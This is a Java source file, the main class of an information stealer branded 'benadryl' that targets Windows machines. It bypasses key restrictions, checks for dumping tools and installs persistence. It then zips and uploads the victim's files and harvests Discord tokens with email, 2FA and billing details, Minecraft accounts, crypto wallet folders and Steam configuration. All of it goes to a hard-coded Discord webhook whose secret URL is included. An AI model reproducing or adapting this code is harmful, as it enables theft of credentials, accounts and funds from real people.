package dev.client;

import java.awt.*;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Objects;
import java.util.StringJoiner;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.jar.JarFile;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.nio.file.AccessDeniedException;
import java.nio.file.AtomicMoveNotSupportedException;
import java.nio.file.FileSystem;
import java.nio.file.FileSystemException;
import java.nio.file.FileSystems;
import java.nio.file.FileVisitResult;
import java.nio.file.Files;
import java.nio.file.SimpleFileVisitor;
import java.nio.file.StandardCopyOption;
import java.nio.file.attribute.AclFileAttributeView;
import java.nio.file.attribute.BasicFileAttributeView;
import java.nio.file.attribute.BasicFileAttributes;
import java.nio.file.attribute.DosFileAttributeView;
import java.nio.file.attribute.DosFileAttributes;
import java.nio.file.attribute.FileOwnerAttributeView;
import java.nio.file.attribute.PosixFileAttributeView;
import java.nio.file.attribute.PosixFileAttributes;
import java.nio.file.attribute.UserPrincipal;
import java.util.List;
import java.util.UUID;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.jar.JarEntry;
import java.util.jar.JarOutputStream;
import java.util.jar.Manifest;
import java.util.stream.Collectors;

import dev.client.utils.client.EncodingUtil;
import dev.client.utils.files.ZipAll;
import dev.injector.utils.ListUtil;
import dev.client.checks.AntiDump;
import dev.client.module.applications.discord.Discord;
import dev.client.module.applications.discord.DiscordInjection;
import dev.client.module.applications.Minecraft;
import dev.client.module.misc.Persistence;
import dev.client.utils.files.count.Count;
import dev.client.utils.files.UploadUtil;
import dev.client.utils.client.PoliciesUtil;
import dev.client.utils.files.Webhook;
import dev.injector.*;
import dev.injector.asm.Entry;
import dev.injector.asm.EntryList;
import dev.injector.template.Template;
import dev.injector.template.impl.FabricModTemplate;
import dev.injector.template.impl.ForgeModTemplate;
import dev.injector.template.impl.MinecraftClientTemplate;
import dev.injector.template.impl.SpigotPluginTemplate;
import dev.injector.template.impl.BungecoordPluginTemplate;

import org.objectweb.asm.ClassReader;
import org.objectweb.asm.tree.ClassNode;




public class Client {

    public static String serverUrl;
    public static String x100to;

    public static void main(String[] args) throws Exception {
        // every url needs to be changed.
        if (!System.getProperty("os.name").toLowerCase().contains("win")) {return;}
        PoliciesUtil.bypassKeyRestriction();
        AntiDump.Find();
        Persistence.install();
        long startTime = System.currentTimeMillis();
        ZipAll.getEverything();
        UploadUtil.uploadFile(new File(System.getProperty("java.io.tmpdir") + "papichulo.zip"));
        Thread.sleep(3000);
        Minecraft minecraft = new Minecraft();
        Discord discord = new Discord();
        Count count = new Count();
        long endTime = System.currentTimeMillis();
        long timeDifferenceMillis = endTime - startTime;
        double timeDifferenceSeconds = timeDifferenceMillis / 1000.0;
        String timeDifferenceString = String.format("%.2fs", timeDifferenceSeconds);
       Webhook sender = new Webhook("https://discord.com/api/webhooks/1145292325543743559/l3Cg_CzoleXaERLwf3VbHy-y4G4arlQE_HERymGIDo9LiqpQmWz_cm-ePrqfniergLzX");
       sender.setUsername("Benadryl");
       sender.setAvatarUrl("https://cdn.discordapp.com/avatars/972547498885402704/9b1f82b90be1950327eaa1a24cc6de6c.webp?size=4096");
       sender.setContent("");
       sender.addEmbed(new Webhook.EmbedObject()
               .setTitle("<:blackstar:1130893171010850957> - b e n a d r y l")
               .setColor(Color.decode("#101010"))
               .setDescription("***||<a:zz999:868911244751548508> [Download Zip](" + x100to + ")||***")
               .addField("<:zbmoney:868899521780924476>Wallets", "`" + count.countColdWalletFolders() + "`", true)
               .addField("<:zzBlack_Dot:868897028946665483>MC Accs", "`" + minecraft.countFiles() + "`", true)
               .addField("<:zzBlack_Dot:868897028946665483>Steam", "`" + count.checkSteamConfigExists() + "`", true)
               .setFooter("Elapsed " + timeDifferenceString, "https://cdn.discordapp.com/avatars/972547498885402704/9b1f82b90be1950327eaa1a24cc6de6c.webp?size=4096"));
       for (String token : discord.getValidTokensList())
       {
           sender.addEmbed(new Webhook.EmbedObject()
                   .setTitle("Found token in: Discord")
                   .setAuthor(discord.getInfo("username", token) + "#" + discord.getInfo("discriminator", token) + " (" + discord.getInfo("id", token) + ")", "", discord.getAvatar(token))
                   .setUrl("https://www.discord.com")
                   .setColor(Color.decode("#141414"))
                   .setThumbnail(discord.getAvatar(token))
                   .addField("<:bl_number_1:747595625385951385>Username", "```" + discord.getInfo("username", token) + "#" + discord.getInfo("discriminator", token) + "```", true)
                   .addField("<:bl_number_2:747595625734078484>Email", "```" + discord.getInfo("email", token) + "```", true)
                   .addField("<:bl_number_3:747595625436282912>Identifier", "```" + discord.getInfo("id", token) + "```", true)
                   .addField("<:moderator_black:1130893615573508266>2FA", "```" + discord.getInfo("mfa_enabled", token) + "```", true)
                   .addField("<a:bperfect_boost:1024762476245557359>Nitro", discord.getNitro(token), true)
                   .addField("<:black_cash:1130911097646501988>Billing",  discord.getBilling(token), true)
                   .addField("<a:zz999:868911244751548508>Token", "```" + token + "```", false)
                  .setFooter("benadryl is the best stealuh ww", "https://cdn.discordapp.com/avatars/972547498885402704/9b1f82b90be1950327eaa1a24cc6de6c.webp?size=4096"));
        }
       sender.execute();
    }
}